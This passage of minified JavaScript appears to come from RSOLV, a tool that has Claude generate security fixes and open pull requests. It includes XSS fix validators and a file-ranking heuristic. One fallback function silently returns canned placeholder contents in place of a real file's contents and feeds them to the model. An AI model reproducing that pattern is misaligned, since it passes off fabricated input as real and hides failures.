Q.length>0?Q:["Monitor compliance requirements"]}determinePriorities(X){let Q=[];if(X.some((J)=>J.severity==="critical"))Q.push("Immediate action required for critical vulnerabilities");if(X.some((J)=>J.severity==="high"))Q.push("High priority fixes should be completed within 24-48 hours");return Q.push("Implement comprehensive security testing"),Q}estimateTimeline(X){let Q=X.filter((Y)=>Y.severity==="critical").length,J=X.filter((Y)=>Y.severity==="high").length;if(Q>0)return"Immediate (within 24 hours)";if(J>0)return"Urgent (within 48 hours)";return"Standard (within 1 week)"}generateBusinessLevelContent(X){let Q=this.calculateRiskScore(X),J=this.groupBySeverity(X);return`Your application has ${X.length} security vulnerabilities with a risk score of ${Q}/100. 
    This includes ${J.critical} critical, ${J.high} high, ${J.medium} medium, 
    and ${J.low} low severity issues. These vulnerabilities pose significant risks to your business 
    operations, customer data, and regulatory compliance.`}extractCodeSnippet(X,Q){for(let J of Object.values(Q)){let Y=J.split(`
`);if(X.line<=Y.length)return Y[X.line-1]||"Code snippet not available"}return"Code snippet not available"}generateSummary(X){let Q=this.groupBySeverity(X),J=this.identifyPrimaryRisks(X),Y=this.estimateFixTime(X);return{totalVulnerabilities:X.length,severityBreakdown:Q,primaryRisks:J,estimatedFixTime:Y}}groupBySeverity(X){let Q={critical:0,high:0,medium:0,low:0};for(let J of X)Q[J.severity]++;return Q}identifyPrimaryRisks(X){return[...new Set(X.map((J)=>this.getVulnerabilityDisplayName(J.type)))].slice(0,3)}estimateFixTime(X){let Q=X.length*2;if(Q<8)return`${Q} hours`;return`${Math.ceil(Q/8)} days`}getVulnerabilityDisplayName(X){return{sql_injection:"SQL Injection",xss:"Cross-Site Scripting (XSS)",broken_access_control:"Broken Access Control",sensitive_data_exposure:"Sensitive Data Exposure",xml_external_entities:"XML External Entities (XXE)",security_misconfiguration:"Security Misconfiguration",vulnerable_components:"Vulnerable Components",broken_authentication:"Broken Authentication",insecure_deserialization:"Insecure Deserialization",insufficient_logging:"Insufficient Logging"}[X]||X}formatLineLevelMarkdown(X){return`### ${X.title}

**Risk Level:** ${X.riskLevel}

${X.content}

**Vulnerable Code:**
\`\`\`javascript
${X.codeSnippet}
\`\`\`

**Secure Example:**
\`\`\`javascript
${X.secureExample}
\`\`\`

`}formatConceptLevelMarkdown(X){let Q=`### ${X.title}

${X.content}

**Prevention Methods:**
`;for(let J of X.preventionMethods)Q+=`- ${J}
`;Q+=`
**Common Attack Scenarios:**
`;for(let J of X.attackScenarios)Q+=`- ${J}
`;return Q+`
`}formatBusinessLevelMarkdown(X){return`### ${X.title}

**Risk Score:** ${X.riskScore}/100

${X.content}

**Business Impact:**
- **Data Loss Risk:** ${X.businessImpact.dataLoss}
- **Reputational Damage:** ${X.businessImpact.reputationalDamage}  
- **Financial Impact:** ${X.businessImpact.financialImpact}
- **Operational Disruption:** ${X.businessImpact.operationalDisruption}

**Timeline:** ${X.timeline}

`}}var iP=$1(()=>{$X()});async function NV(X,Q,J,Y,W,G){try{if(V.info(`Generating solution for issue #${X.number}`),J.aiProvider.provider==="claude-code"&&!Y){V.info("Using Claude Code for solution generation");let M;if(J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,V.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:F}=await Promise.resolve().then(() => (RX(),K7));M=await F.getInstance(J.rsolvApiKey)}let L=K8({repoPath:process.cwd(),credentialManager:M,useVendedCredentials:J.aiProvider.useVendedCredentials,model:J.aiProvider.model,maxTurns:3}),R={summary:`${Q.issueType} issue requiring fixes`,complexity:Q.estimatedComplexity==="simple"?"low":Q.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[Q.suggestedApproach],recommendedApproach:Q.suggestedApproach,relatedFiles:Q.filesToModify},j=await L.generateSolution(X,R);if(j.success){let F={};if(j.filesModified)for(let A of j.filesModified)try{let O=await import("fs/promises");F[A]=await O.readFile(A,"utf-8")}catch{F[A]="<file content unavailable>"}return{success:!0,message:"Solution generated with Claude Code",changes:F}}if(j.error&&j.error.includes("Claude Code CLI not available"))V.info("Claude Code not available, falling back to standard AI provider API");else return{success:!1,message:j.message,error:j.error}}let H=J.aiProvider.provider==="claude-code"?{...J.aiProvider,provider:"anthropic",model:"claude-sonnet-4-5-20250929"}:J.aiProvider,$=Y||await k6(H),z=await ue1(X,Q,W);if(Object.keys(z).length===0)return V.warn(`No files found for analysis in issue #${X.number}`),{success:!1,message:"No relevant files found for analysis"};let U=dD(Q.issueType),K=`${lD(X,Q,z)}

${U}`,B;if(G&&G.vulnerabilities&&G.vulnerabilities.length>0)V.info(`Including ${G.vulnerabilities.length} security vulnerabilities in solution prompt`),B=new DV().generateCompleteExplanation(G.vulnerabilities,z),V.info(`Generated three-tier explanations for ${B.lineLevelExplanations.length} vulnerabilities`),K+=`

## Security Analysis Results

The following security vulnerabilities were detected and MUST be addressed in your solution:

${G.vulnerabilities.map((L)=>`- **${L.severity} Severity**: ${L.type} in ${L.file}:${L.line}
   Pattern: ${L.pattern}
   Risk: ${L.risk}
   Recommendation: ${L.recommendation}`).join(`

`)}

Please ensure your solution addresses these security issues as a priority.`;V.info(`Calling AI with prompt length: ${K.length} chars`),V.info("Prompt preview (first 500 chars):",K.substring(0,500)),V.info("Prompt preview (last 500 chars):",K.substring(K.length-500));let q=await $.complete(K,{temperature:0.2,model:J.aiProvider.model||"claude-sonnet-4-5-20250929"});V.info(`AI response length: ${q.length} chars`),V.info("Raw AI solution response (first 1000 chars):",q.substring(0,1000));let Z=ce1(q);if(V.debug(`Parsed ${Object.keys(Z).length} file changes from response`),Object.keys(Z).length===0)return V.warn(`No changes extracted from solution for issue #${X.number}`),{success:!1,message:"Failed to extract file changes from AI solution"};return{success:!0,message:"Solution generated successfully",changes:Z,explanations:B}}catch(H){return V.error(`Error generating solution for issue #${X.number}`,H),{success:!1,message:`Error generating solution: ${H instanceof Error?H.message:String(H)}`,error:String(H)}}}async function ue1(X,Q,J){try{let Y=[...Q.filesToModify||[]];if(Y.length===0){V.info("No files explicitly identified, inferring from issue content");let G=`${X.title} ${X.body}`,H=/\.([a-zA-Z0-9]+)\b/g,$=[],z;while((z=H.exec(G))!==null)if(!$.includes(z[1]))$.push(z[1]);V.debug(`Inferred file extensions: ${$.join(", ")}`)}V.info(`Fetching content for ${Y.length} files`);let W={};for(let G of Y)try{if(J)W[G]=await J(G);else W[G]=await le1(G);V.debug(`Fetched content for ${G}`)}catch(H){V.warn(`Failed to fetch content for ${G}`,H)}return W}catch(Y){return V.error("Error getting files for analysis",Y),{}}}function ce1(X){let Q={};try{let J=/---\s*([\w./-]+)\s*---\s*```[\w]*\n?([\s\S]*?)```/gm,Y;while((Y=J.exec(X))!==null){let[,W,G]=Y;if(W&&G)Q[W]=G.trim()}if(Object.keys(Q).length===0){let W=/```(\w+)\s+([\w./-]+)\n([\s\S]*?)```/gm;while((Y=W.exec(X))!==null){let[,,G,H]=Y;if(G&&H)Q[G]=H.trim()}}if(Object.keys(Q).length===0){let W=/([\w./-]+):\s*```[\w]*\n?([\s\S]*?)```/gm;while((Y=W.exec(X))!==null){let[,G,H]=Y;if(G&&H)Q[G]=H.trim()}}if(Object.keys(Q).length===0){let W=/```[\w]*\n?([\s\S]*?)```/gm,G=/([\w./-]+\.\w+)/;while((Y=W.exec(X))!==null){let H=Y[1],$=Math.max(0,Y.index-100),U=X.substring($,Y.index).match(G);if(U&&H)Q[U[1]]=H.trim()}}return Q}catch(J){return V.error("Error parsing solution response",J),{}}}async function le1(X){switch(await new Promise((J)=>setTimeout(J,100)),X.split(".").pop()?.toLowerCase()){case"js":return`// Example JavaScript file content for ${X}
function processData(input) {
  // TODO: Implement proper validation
  return input.map(item => item.value);
}

module.exports = { processData };
`;case"ts":return`// Example TypeScript file content for ${X}
interface DataItem {
  id: string;
  value: number;
}

function processData(input: DataItem[]): number[] {
  // TODO: Implement proper validation
  return input.map(item => item.value);
}

export { DataItem, processData };
`;case"py":return`# Example Python file content for ${X}
def process_data(input_data):
    # TODO: Implement proper validation
    return [item['value'] for item in input_data]

if __name__ == "__main__":
    print(process_data([{'value': 1}, {'value': 2}]))
`;case"md":return`# Documentation for ${X.split("/").pop()?.replace(".md","")}

## Overview

This documentation describes the usage and implementation details.

## Installation

\`\`\`bash
npm install example-package
\`\`\`

## Usage

\`\`\`javascript
const { processData } = require('example-package');
const result = processData([{ id: '1', value: 42 }]);
\`\`\`
`;default:return`// Example file content for ${X}
// This is a placeholder for demonstration purposes
`}}var rP=$1(()=>{y1();N5();iP();zJ()});async function nP(X,Q,J,Y,W,G){try{V.info(`Creating pull request for issue #${X.number}`);let H=await pe1(X);await ie1(H,Q,X);let $=await re1(X,J,Q,Y,W,G),z=await ne1(X,H,$,J,Y);return V.info(`Successfully created PR #${z.pullRequestNumber} for issue #${X.number}`),z}catch(H){return V.error(`Error creating pull request for issue #${X.number}`,H),{success:!1,message:`Error creating pull request: ${H instanceof Error?H.message:String(H)}`,error:String(H)}}}async function pe1(X){let Q=X.title.toLowerCase().replace(/[^\w\s-]/g,"").trim().replace(/[\s]+/g,"-").substring(0,30),J=`rsolv/${X.number}-${Q}`;try{V.info(`Creating branch: ${J}`);let Y=v0(),{owner:W,name:G}=X.repository;try{await Y.git.createRef({owner:W,repo:G,ref:`refs/heads/${J}`,sha:await de1(W,G,X.repository.defaultBranch)}),V.info(`Branch ${J} created successfully`)}catch(H){if(H.status===422)V.warn(`Branch ${J} already exists, using existing branch`);else throw H}return J}catch(Y){throw V.error(`Error creating branch ${J}`,Y),Error(`Failed to create branch: ${Y instanceof Error?Y.message:String(Y)}`)}}async function de1(X,Q,J){try{let Y=v0(),{data:W}=await Y.git.getRef({owner:X,repo:Q,ref:`heads/${J}`});return W.object.sha}catch(Y){throw V.error(`Error getting SHA for ${J}`,Y),Error(`Failed to get SHA for ${J}: ${Y instanceof Error?Y.message:String(Y)}`)}}async function ie1(X,Q,J){try{V.info(`Applying ${Object.keys(Q).length} file changes to branch ${X}`);let Y=v0(),{owner:W,name:G}=J.repository,H=5,$=Object.keys(Q);for(let z=0;z<$.length;z+=H){let U=$.slice(z,z+H);if(await Promise.all(U.map(async(K)=>{try{let B;try{let q=await Y.repos.getContent({owner:W,repo:G,path:K,ref:X});if(!Array.isArray(q.data))B=q.data.sha}catch(q){if(q.status!==404)throw q}await Y.repos.createOrUpdateFileContents({owner:W,repo:G,path:K,message:`Update ${K} for issue #${J.number}`,content:Buffer.from(Q[K]).toString("base64"),branch:X,sha:B}),V.debug(`Updated file: ${K}`)}catch(B){throw V.error(`Error updating file ${K}`,B),B}})),z+H<$.length)await new Promise((K)=>setTimeout(K,200))}V.info("All changes applied successfully")}catch(Y){throw V.error("Error applying changes to branch",Y),Error(`Failed to apply changes: ${Y instanceof Error?Y.message:String(Y)}`)}}async function re1(X,Q,J,Y,W,G){try{V.info(`Generating PR description for issue #${X.number}`);let H=await k6(Y.aiProvider),$=pD(X,Q,J),U=await H.complete($,{temperature:0.3,model:Y.aiProvider.model});if(W&&W.vulnerabilities&&W.vulnerabilities.length>0)U+=`

## \uD83D\uDD12 Security Fixes

This PR addresses the following security vulnerabilities:

`,W.vulnerabilities.forEach((K)=>{U+=`- **${K.severity}**: ${K.type} in \`${K.file}:${K.line}\`
`,U+=`  - Risk: ${K.risk}
`,U+=`  - Fixed by: ${K.recommendation}

`}),U+=`
### Security Impact
`,U+=`- **Vulnerabilities Fixed**: ${W.vulnerabilities.length}
`,U+=`- **Risk Level**: ${W.riskLevel||"Medium"}
`,U+=`- **Compliance**: OWASP Top 10 coverage
`;if(G){V.info("Including three-tier explanations in PR description"),U+=`

## \uD83D\uDCDA Educational Explanations

`;let K=G.businessLevelExplanation;if(U+=`### Executive Summary

`,U+=`**Risk Score**: ${K.riskScore}/100

`,U+=`${K.content}

`,U+=`**Key Business Impacts:**
`,U+=`- \uD83D\uDCB0 Financial: ${K.businessImpact.financialImpact}
`,U+=`- \uD83C\uDFE2 Reputation: ${K.businessImpact.reputationalDamage}
`,U+=`- \uD83D\uDCCA Operations: ${K.businessImpact.operationalDisruption}
`,U+=`- \uD83D\uDD12 Data: ${K.businessImpact.dataLoss}

`,K.priorities.length>0)U+=`**Recommended Actions:**
`,K.priorities.forEach((B)=>{U+=`- ${B}
`}),U+=`
`;if(U+=`<details>
<summary>View detailed technical explanations</summary>

`,G.conceptLevelExplanations.length>0)U+=`### Security Concepts

`,G.conceptLevelExplanations.forEach((B)=>{if(U+=`**${B.title}**
`,U+=`${B.content}

`,B.preventionMethods.length>0)U+=`Prevention methods:
`,B.preventionMethods.forEach((q)=>{U+=`- ${q}
`}),U+=`
`});U+=`</details>
`}return U+=`

This PR was automatically generated by [RSOLV](https://rsolv.dev) to address issue #${X.number}.`,U}catch(H){return V.error("Error generating PR description",H),`Fix for issue #${X.number}

This PR addresses the issue "${X.title}" by making changes to ${Object.keys(J).length} files.

This PR was automatically generated by [RSOLV](https://rsolv.dev).`}}async function ne1(X,Q,J,Y,W){try{let G=`[RSOLV] ${X.title} (fixes #${X.number})`;V.info(`Creating PR: ${G}`);let H=v0(),{owner:$,name:z}=X.repository,{data:U}=await H.pulls.create({owner:$,repo:z,title:G,body:J,head:Q,base:X.repository.defaultBranch,draft:!1});return V.info(`Pull request created: ${U.html_url}`),await H.issues.addLabels({owner:$,repo:z,issue_number:U.number,labels:["rsolv:automated",`type:${Y.issueType}`]}),await H.issues.createComment({owner:$,repo:z,issue_number:X.number,body:`I've created a pull request to address this issue: ${U.html_url}

This was automatically generated by [RSOLV](https://rsolv.dev).`}),await ae1(X,U,G,W),{success:!0,message:"Pull request created successfully",pullRequestUrl:U.html_url,pullRequestNumber:U.number}}catch(G){throw V.error("Error creating GitHub PR",G),Error(`Failed to create GitHub PR: ${G instanceof Error?G.message:String(G)}`)}}async function ae1(X,Q,J,Y){try{let W=process.env.RSOLV_API_URL||"https://api.rsolv.dev",G=process.env.RSOLV_API_KEY||Y.rsolvApiKey;if(!G){V.warn("RSOLV API key not configured, skipping fix attempt recording");return}let H=new _8({baseUrl:W,apiKey:G}),$={github_org:X.repository.owner,repo_name:X.repository.name,issue_number:X.number,pr_number:Q.number,pr_title:J,pr_url:Q.html_url,issue_title:X.title,issue_url:`https://github.com/${X.repository.fullName}/issues/${X.number}`,api_key_used:G,metadata:{branch:Q.head?.ref||`rsolv/${X.number}`,labels:["rsolv:automated"],created_by:"rsolv-action"}};V.info(`Recording fix attempt for PR #${Q.number}`);let z=await H.recordFixAttempt($);if(z.success)V.info(`Fix attempt recorded successfully: ID ${z.data?.id}`);else V.error(`Failed to record fix attempt: ${z.error}`)}catch(W){V.error("Error recording fix attempt",W)}}var aP=$1(()=>{y1();g9();N5()});import{execSync as wV}from"child_process";function IV(){try{try{wV("which claude",{stdio:"ignore"})}catch{return!1}let X=!1;try{let Y=wV("claude --version 2>&1",{encoding:"utf-8",timeout:5000}).toString().trim();V.debug(`Claude CLI version: ${Y}`),X=!0}catch(Y){return V.debug("Claude CLI version check failed:",Y.message),!1}let Q=wV('echo "test" | claude --print 2>&1 || echo "FAILED"',{encoding:"utf-8",timeout:30000,shell:"/bin/sh"}).toString().trim(),J=Q.length>0&&!Q.toLowerCase().includes("authenticate")&&!Q.toLowerCase().includes("not found");return V.debug(`Claude Max check result: "${Q.substring(0,50)}..." - Working: ${J}`),J}catch(X){return V.debug("Claude Code Max not available:",X.message),!1}}var CV;var oP=$1(()=>{DK();y1();CV=class CV extends lQ{useClaudeMax=!1;constructor(X,Q=process.cwd(),J){super(X,Q,J);if(this.isDevelopmentMode())if(this.useClaudeMax=IV(),this.useClaudeMax)V.info(" Claude Code Max detected and will be used for development");else V.info(" Development mode enabled but Claude Code Max not available/authenticated")}async generateSolution(X,Q,J){if(this.isDevelopmentMode()&&this.useClaudeMax){V.info("\uD83D\uDE80 Using Claude Code Max (signed-in account) for development");let W=J||this.constructPrompt(X,Q);if(V.info(`Working directory: ${this.repoPath}`),V.info(`Prompt length: ${W.length} characters`),!(await this.executeWithRetry(W,{cwd:this.repoPath,env:{...process.env,ANTHROPIC_API_KEY:void 0,CLAUDE_CODE_MAX_API_KEY:void 0}})).success)return V.warn("Claude Code Max execution failed, falling back to API mode"),super.generateSolution(X,Q,J);let H=this.getModifiedFiles();if(H.length===0)return{success:!1,message:"No files were modified by Claude Code Max",error:"Claude Code Max did not make any file changes"};V.info(` Files modified by Claude Code Max: ${H.join(", ")}`);let $={};for(let z of H)$[z]="Modified by Claude Code Max";return{success:!0,message:`Successfully modified ${H.length} file(s) using Claude Code Max`,changes:$}}return super.generateSolution(X,Q,J)}async generateSolutionWithGit(X,Q,J,Y,W,G){return V.info("Claude Code Max: Using generateSolution (git operations handled by Claude)"),this.generateSolution(X,Q,J)}isDevelopmentMode(){return process.env.RSOLV_DEV_MODE==="true"||process.env.USE_CLAUDE_CODE_MAX==="true"}}});var tP={};Y9(tP,{getVulnerableFiles:()=>te1});import*as FG from"fs";import*as Y4 from"path";async function te1(X,Q=10){let J=new Map;try{let W=(await sP(X)).map((G)=>({path:G,score:X10(G)}));W.sort((G,H)=>H.score-G.score);for(let{path:G}of W.slice(0,Q))try{let H=Y4.relative(X,G),$=FG.readFileSync(G,"utf8");J.set(H,$),V.debug(`Added vulnerable file candidate: ${H}`)}catch(H){V.debug(`Could not read file ${G}:`,H)}}catch(Y){V.warn("Error scanning for vulnerable files:",Y)}return J}async function sP(X,Q=[],J=0){if(J>3)return Q;try{let Y=FG.readdirSync(X,{withFileTypes:!0});for(let W of Y){let G=Y4.join(X,W.name);if(W.isDirectory()){if(["node_modules",".git","dist","build","vendor","coverage"].includes(W.name))continue;await sP(G,Q,J+1)}else if(W.isFile()){let H=Y4.extname(W.name).toLowerCase();if(Object.values(se1).flat().includes(H)&&ee1(W.name))Q.push(G)}}}catch(Y){}return Q}function ee1(X){let Q=X.toLowerCase();return oe1.some((J)=>Q.includes(J))}function X10(X){let Q=0,J=X.toLowerCase();if(J.includes("auth"))Q+=10;if(J.includes("login"))Q+=10;if(J.includes("password"))Q+=8;if(J.includes("token"))Q+=8;if(J.includes("sql")||J.includes("query"))Q+=7;if(J.includes("upload"))Q+=7;if(J.includes("controller")||J.includes("handler"))Q+=5;if(J.includes("route"))Q+=4;if(J.includes("api"))Q+=4;if(J.includes("config"))Q+=3;if(J.includes("test")||J.includes("spec"))Q-=5;return Q}var oe1,se1;var eP=$1(()=>{y1();oe1=["auth","login","session","password","token","crypto","database","query","sql","db","route","controller","handler","api","endpoint","form","input","upload","search","config","settings","env"],se1={javascript:[".js",".jsx"],typescript:[".ts",".tsx"],python:[".py"],ruby:[".rb"],php:[".php"],java:[".java"],elixir:[".ex",".exs"]}});var PV={};Y9(PV,{shouldUseStaticValidation:()=>J10,StaticXSSValidator:()=>XS});import{execSync as Q10}from"child_process";class XS{validateXSSFix(X,Q,J){try{let Y=this.getFileAtCommit(X,Q),W=this.getFileAtCommit(X,J),G=this.findVulnerablePatterns(W),H=this.findSafePatterns(W),$=this.validateFix(Y,W);return{isValidFix:$,vulnerablePatterns:G,safePatterns:H,error:$?void 0:"Vulnerable patterns still present or safe patterns not found"}}catch(Y){return V.error("Static validation failed",Y),{isValidFix:!1,vulnerablePatterns:[],safePatterns:[],error:Y.message}}}getFileAtCommit(X,Q){try{return Q10(`git show ${Q}:${X}`,{encoding:"utf-8",stdio:"pipe"})}catch(J){throw V.error(`Failed to get file ${X} at commit ${Q}`,J),J}}findVulnerablePatterns(X){let Q=[];if(/document\.write\s*\([^)]*\+[^)]*\)/.test(X))Q.push("document.write with concatenation");if(/innerHTML\s*=\s*[^;]*\+/.test(X))Q.push("innerHTML with concatenation");if(/eval\s*\([^)]*location\.|eval\s*\([^)]*window\./.test(X))Q.push("eval with potential user input");if(/\$\{[^}]*location\.[^}]*\}/.test(X)&&/innerHTML|document\.write/.test(X))Q.push("template literal with location in unsafe context");if(/document\.write.*location\.host/.test(X))Q.push("document.write with location.host");return Q}findSafePatterns(X){let Q=[];if(/document\.createElement\s*\(\s*['"]script['"]\s*\)/.test(X))Q.push("createElement for script tags");if(/appendChild\s*\(/.test(X))Q.push("appendChild for DOM manipulation");if(/textContent\s*=/.test(X))Q.push("textContent for safe text insertion");if(/allowedHosts|whitelist|includes\s*\(/.test(X))Q.push("whitelist validation");if(/localhost:35729|127\.0\.0\.1:35729/.test(X)&&!/location\.host/.test(X))Q.push("hardcoded safe values");return Q}validateFix(X,Q){let J=this.findVulnerablePatterns(X).length>0,Y=this.findVulnerablePatterns(Q).length>0,W=this.findSafePatterns(Q).length>0;if(X.includes("environmentalScripts")&&Q.includes("environmentalScripts")){let G=/document\.write.*location\.host/.test(X),H=/document\.write.*location\.host/.test(Q);if(G&&!H){let $=/createElement.*script/.test(Q),z=/appendChild/.test(Q),U=/localhost:35729|127\.0\.0\.1:35729/.test(Q);return $&&z||U}}return J&&!Y&&W}}function J10(X,Q){if(X==="XSS"||X==="Xss"){if(Q.includes("config/")&&Q.endsWith(".js"))return Q.includes("development.js")||Q.includes("client")||Q.includes("browser");if(Q.endsWith(".html")&&!Q.includes("template"))return!0;if((Q.includes("public/")||Q.includes("static/"))&&Q.endsWith(".js"))return!0}return!1}var SV=$1(()=>{y1()});import{execSync as o8}from"child_process";function kX(X){return"commitHash"in X}function Y10(X,Q){let J=X.labels.find((Y)=>Y.startsWith("fix-validation-max-"));if(J){let Y=parseInt(J.replace("fix-validation-max-",""));if(!isNaN(Y))return Y}if(Q.fixValidation?.maxIterationsByType){let Y=W10(X),W=Q.fixValidation.maxIterationsByType[Y];if(W!==void 0)return W}if(Q.customerTier&&Q.fixValidation?.maxIterationsByTier){let Y=Q.fixValidation.maxIterationsByTier[Q.customerTier];if(Y!==void 0)return Y}if(Q.fixValidation?.maxIterations!==void 0)return Q.fixValidation.maxIterations;return 3}function W10(X){let Q=`${X.title} ${X.body}`.toLowerCase();if(Q.includes("sql injection"))return"sql-injection";if(Q.includes("xss")||Q.includes("cross-site scripting"))return"xss";if(Q.includes("command injection"))return"command-injection";if(Q.includes("path traversal"))return"path-traversal";if(Q.includes("xxe")||Q.includes("xml external entity"))return"xxe";return"unknown"}function G10(X,Q,J,Y,W){let G=J.generatedTests?.tests?.[0]?.testCode||"",H=J.generatedTests?.tests?.[0]?.framework||"unknown";return{...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Previous Fix Attempt Failed

The previous fix did not pass the generated security tests:

### Test Results (RFC-060: RED-only):
- Vulnerable Code - RED tests: ${Q.vulnerableCommit.allPassed?" PASSED (unexpected!)":" FAILED (expected)"}
- Fixed Code - RED tests: ${Q.fixedCommit.allPassed?" PASSED (expected)":" FAILED (problem!) - RED test failed"}

### Generated Test Code:
\`\`\`${H}
${G}
\`\`\`

Please fix the vulnerability again, ensuring the fix passes RED tests.

### Why the Previous Fix Failed:
${H10(Q)}

### RFC-060 Requirements:
1. The vulnerability must be completely fixed (RED tests must pass on fixed code)
2. RED tests should have FAILED on vulnerable code (proving vulnerability existed)
3. If RED tests passed on vulnerable code, the tests may be incorrect

This is attempt ${Y+1} of ${W}.`}}function H10(X){let Q=[];if(!X.fixedCommit.allPassed){if(Q.push("- **The vulnerability still exists** - RED tests are still failing on your fixed code"),X.fixedCommit.redTestsPassed&&X.fixedCommit.redTestsPassed.length>1){let J=X.fixedCommit.redTestsPassed.map((Y,W)=>!Y?`RED test ${W+1}`:null).filter(Boolean);if(J.length>0)Q.push(`  Failed tests: ${J.join(", ")}`)}}if(X.vulnerableCommit.allPassed)Q.push("- **Warning**: RED tests passed on vulnerable code (they should have failed!)"),Q.push("  This suggests the tests may not be properly detecting the vulnerability");return Q.join(`
`)}function $10(){try{return o8("git rev-parse HEAD",{encoding:"utf-8"}).trim()}catch(X){throw V.error("Failed to get current commit",X),Error("Cannot determine current commit")}}async function JS(X,Q,J){let Y=Date.now(),W=$10();try{if(V.info(`Processing issue #${X.number} with git-based approach`),V.info("[DEBUG] Issue has specificVulnerabilities:",!!X.specificVulnerabilities),X.specificVulnerabilities)V.info("[DEBUG] Vulnerability count:",X.specificVulnerabilities.length),V.info("[DEBUG] First vulnerability:",JSON.stringify(X.specificVulnerabilities[0],null,2));if(X.testContext){let N=X.testContext;if(V.info("[RFC-058] Test context available from validation branch:",{branchCheckedOut:N.branchCheckedOut,testFilesFound:N.testFilesFound,hasEnhancedPrompt:!!N.enhancedPrompt}),N.enhancedPrompt)X={...X,body:N.enhancedPrompt},V.info("[RFC-058] Enhanced issue with test-aware prompt from validation branch")}let G=QS();if(!G.clean){V.warn(`Repository has uncommitted changes: ${G.modifiedFiles.join(", ")}`),z10();let N=QS();if(!N.clean)return{issueId:X.id,success:!1,message:"Repository has uncommitted changes that could not be cleaned",error:`Uncommitted changes in: ${N.modifiedFiles.join(", ")}`};V.info("Repository cleaned successfully, proceeding with issue processing")}V.info(`Analyzing issue #${X.number}`);let H=await Q8(X,Q);if(!H||!H.canBeFixed)return{issueId:X.id,success:!1,message:"Issue cannot be automatically fixed based on analysis"};let $,z=null;if(J){if(z=GG(J,X.number),z)V.info(`[MITIGATE] Using proven RED test from VALIDATE (${z.framework}, file: ${z.testFile})`),V.info("[MITIGATE] Skipping TestGeneratingSecurityAnalyzer  VALIDATE already proved the vulnerability")}if(!z&&(Q.testGeneration?.enabled||Q.fixValidation?.enabled!==!1)&&Q.enableSecurityAnalysis){V.info(`Generating tests for issue #${X.number}`);let N={provider:"anthropic",apiKey:Q.aiProvider.providerApiKey,model:Q.aiProvider.model,temperature:0.2,maxTokens:Q.aiProvider.maxTokens,useVendedCredentials:Q.aiProvider.useVendedCredentials},C=new C5(N),_=new Map;if(H.filesToModify&&H.filesToModify.length>0){let h=(await import("fs")).default,o=(await import("path")).default;for(let p of H.filesToModify)try{let e=o.resolve(process.cwd(),p);if(h.existsSync(e)){let d=h.readFileSync(e,"utf8");_.set(p,d),V.debug(`Added file for test generation: ${p}`)}}catch(e){V.warn(`Could not read file ${p} for test generation:`,e)}}if(_.size===0){V.info("No specific files found, scanning for common vulnerable file patterns...");let{getVulnerableFiles:h}=await Promise.resolve().then(() => (eP(),tP));(await h(process.cwd())).forEach((p,e)=>_.set(e,p))}$=await C.analyzeWithTestGeneration(X,Q,_)}let U={provider:"anthropic",apiKey:Q.aiProvider.providerApiKey,model:Q.aiProvider.model,temperature:0.1,maxTokens:Q.aiProvider.maxTokens,useVendedCredentials:Q.aiProvider.useVendedCredentials,claudeCodeConfig:{verboseLogging:!0,timeout:600000,executablePath:process.env.CLAUDE_CODE_PATH,useStructuredPhases:Q.useStructuredPhases}},B=process.env.RSOLV_DEV_MODE==="true"&&process.env.RSOLV_USE_CLAUDE_MAX==="true"&&IV(),q;if(!B&&Q.aiProvider.useVendedCredentials&&Q.rsolvApiKey){process.env.RSOLV_API_KEY=Q.rsolvApiKey,V.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:N}=await Promise.resolve().then(() => (RX(),K7));q=await N.getInstance(Q.rsolvApiKey),V.info("Using vended credentials singleton for Claude Code")}let Z,M=0,L=Y10(X,Q),R=X;while(M<L){V.info(`Executing Claude Code to fix vulnerabilities (attempt ${M+1}/${L})...`);let N=B?new CV(U,process.cwd(),q):K8({repoPath:process.cwd(),credentialManager:q,useVendedCredentials:U.useVendedCredentials,maxTurns:3,model:U.model,testFilePatterns:["test/","tests/","spec/","__tests__/",".test.",".spec."],verbose:U.claudeCodeConfig?.verboseLogging});if(B)V.info("\uD83D\uDE80 Using Claude Code Max (local authentication) for development");let C=M>0?{current:M+1,max:L}:void 0,_={summary:`${H.issueType} issue analysis`,complexity:H.estimatedComplexity==="simple"?"low":H.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[H.suggestedApproach],recommendedApproach:H.suggestedApproach,relatedFiles:H.filesToModify};if(Z=await N.generateSolutionWithGit(R,_,void 0,$,void 0,C),!Z.success)return{issueId:X.id,success:!1,message:Z.message,error:Z.error};V.info(`[DEBUG] DISABLE_FIX_VALIDATION env var: ${process.env.DISABLE_FIX_VALIDATION}`),V.info(`[DEBUG] config.fixValidation?.enabled: ${Q.fixValidation?.enabled}`),V.info(`[DEBUG] config.testGeneration?.validateFixes: ${Q.testGeneration?.validateFixes}`);let h=Q.fixValidation?.enabled===!1;if(V.info(`[DEBUG] skipValidation calculated as: ${h}`),h){V.info("\uD83D\uDCCB Skipping fix validation (DISABLE_FIX_VALIDATION=true)"),V.info("Fix will be applied without validation - proceeding to PR creation");break}if(Q.testGeneration?.validateFixes===!0||Q.fixValidation?.enabled===!0||Q.fixValidation?.enabled!==!1&&($?.generatedTests?.success||z)){let{shouldUseStaticValidation:p}=await Promise.resolve().then(() => (SV(),PV)),e=H.vulnerabilityType||"unknown",d=H.filesToModify?.[0]||"",Q1=!1,V1=null;if(p(e,d)){V.info(`Validating fix with static analysis for ${e} in ${d}...`);let{StaticXSSValidator:D1}=await Promise.resolve().then(() => (SV(),PV)),t=new D1().validateXSSFix(d,W,kX(Z)?Z.commitHash:"HEAD");if(t.isValidFix)V.info(" Fix validated successfully using static analysis"),V.info(`Safe patterns found: ${t.safePatterns.join(", ")}`),Q1=!0;else V.warn(" Static validation failed"),V.warn(`Vulnerable patterns still present: ${t.vulnerablePatterns.join(", ")}`),V1={isValidFix:!1,error:t.error,vulnerablePatterns:t.vulnerablePatterns,fixedCommit:{redTestPassed:!1,greenTestPassed:!1,refactorTestPassed:!0}}}else if(z){V.info(`[MITIGATE] Verifying fix with VALIDATE RED test (${z.framework})...`);let D1=await HG(W,kX(Z)?Z.commitHash:"HEAD",z,process.cwd());if(V1=D1,D1.isValidFix)V.info("[MITIGATE] Fix verified: RED test now 